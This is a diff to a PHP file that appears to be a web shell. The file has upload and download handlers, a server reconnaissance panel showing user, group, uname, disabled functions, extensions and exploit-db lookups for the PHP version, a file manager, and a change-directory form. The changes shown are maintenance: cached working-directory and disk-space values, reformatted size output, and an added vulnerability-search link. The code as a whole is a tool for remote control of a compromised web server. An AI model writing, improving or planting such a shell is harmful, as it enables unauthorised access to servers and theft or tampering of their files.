@@ -44,9 +44,13 @@ function show_alert($msg)
 	echo( sprintf("<script>alert('%s');</script>", $msg) );
 }
 
+$cwd = posix_getcwd();
+$free_disk_space = disk_free_space("/");
+$total_disk_space = disk_total_space("/");
+
 if (isset($_FILES["upload"]))
 {
-	$target_directory = getcwd();
+	$target_directory = $cwd;
 	$target_file = $target_directory . "/" . basename($_FILES["upload"]["name"]);
 	$result_u = null;
 
@@ -69,7 +73,7 @@ if (isset($_FILES["upload"]))
 
 if (isset($_POST["download"]))
 {
-	$target_directory = getcwd();
+	$target_directory = $cwd;
 	$target_file = $target_directory . "/" . $_POST["download"];
 	$result_d = null;
 
@@ -202,7 +206,7 @@ echo( sprintf("
 		<tr><td>PHP Info</td><td>%s | Safe Mode: <b>%s</b> Magic Quotes: <b>%s</b> | Error Reporting Level: <b>%s</b> | Disable Functions: <b>%s</b> <a href='https://www.php.net/manual/en/ini.core.php#ini.disable-functions' target='_blank'>[php.net]</a></td></tr>
 		<tr><td>PHP Extensions</td><td>cURL: <b>%s</b> rar: <b>%s</b> zip: <b>%s</b> | MySQL/MariaDB: <b>%s</b> MongoDB: <b>%s</b> PostgreSQL: <b>%s</b> | SSH2: <b>%s</b> FTP: <b>%s</b></td></tr>
 		<tr><td>Current Directory</td><td>%s</td></tr>
-		<tr><td>Free / Total disk space</td><td>%sGB / %sGB</td></tr>
+		<tr><td>Free / Total disk space</td><td>%s / %s (%s)</td></tr>
 	</table>
 	",
 	$_SERVER["REMOTE_ADDR"],
@@ -212,7 +216,7 @@ echo( sprintf("
 	sprintf("%s ( %s )", posix_getuid(), posix_getpwuid(posix_getuid())["name"]),
 	sprintf("%s ( %s )", posix_getgid(), posix_getgrgid(posix_getgid())["name"]),
 	implode(" ", posix_uname()),
-	PHP_VERSION . " <a href='https://www.exploit-db.com/search?q=PHP' target='_blank'>[exploit-db]</a>",
+	PHP_VERSION . " <a href='https://duckduckgo.com/?q=php+vulnerabilities' target='_blank'>[DuckDuckGo]</a> <a href='https://www.exploit-db.com/search?q=PHP' target='_blank'>[exploit-db]</a>",
 	((int) ini_get("safe_mode")) ? "ON": "OFF",
 	(function_exists("get_magic_quotes_runtime") AND get_magic_quotes_runtime()) ? "ON" : "OFF",
 	error_reporting(),
@@ -227,9 +231,10 @@ echo( sprintf("
 
 	extension_loaded("ssh2") ? "ON" : "OFF",
 	extension_loaded("ftp") ? "ON" : "OFF",
-	posix_getcwd(),
-	round(disk_free_space("/") / 1024 / 1024 / 1024, 2),
-	round(disk_total_space("/") / 1024 / 1024 / 1024, 2)
+	$cwd,
+	format_size($free_disk_space),
+	format_size($total_disk_space),
+	number_format(($free_disk_space / $total_disk_space) * 100, 2, ".", "") . "%"
 	)
 );
 ?>
@@ -267,8 +272,6 @@ if (isset($result))
 <h1>File Manager</h1>
 
 <?php
-$cwd = getcwd();
-
 if ($cwd)
 {
 	$files = scandir($cwd);
@@ -368,7 +371,7 @@ if ($cwd)
 
 <form action="<? echo($shell); ?>" method="POST">
 	<label for="dir">Folder:</label>
-	<input type="text" id="dir" name="dir" placeholder="..">
+	<input type="text" id="dir" name="dir" value="<?php echo($cwd); ?>" size="32">
 	<input type="submit" value="Change Directory">
 </form>
 
